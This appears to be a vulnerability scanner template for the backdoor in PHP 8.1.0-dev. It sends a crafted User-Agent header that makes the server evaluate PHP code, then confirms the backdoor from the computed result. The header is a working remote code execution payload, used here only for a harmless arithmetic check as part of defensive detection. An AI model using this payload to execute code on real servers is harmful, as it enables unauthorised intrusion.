id: php-zerodium-backdoor-rce
info:
  name: PHP 8.1.0-dev - Backdoor Remote Code Execution
  author: dhiyaneshDk
  severity: critical
  description: PHP 8.1.0-dev website development platform has a backdoor called 'zerodiumvar_dump'
    that can be used to remotely execute malicious PHP code.
  reference:
  - https://news-web.php.net/php.internals/113838
  - https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: php,backdoor,rce,zerodium
  metadata:
    impact: The discovery of the backdoor in PHP 8.1.0-dev could have a significant
      impact on the security of websites and applications using the programming language.
    recommendation: It is highly recommended to patch or avoid PHP 8.1.0-dev due to
      the presence of a dangerous backdoor that could compromise the security of a
      system.
requests:
- method: GET
  path:
  - '{{BaseURL}}'
  headers:
    User-Agent: zerodiumvar_dump(233333*333332);
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - int(77777355556)
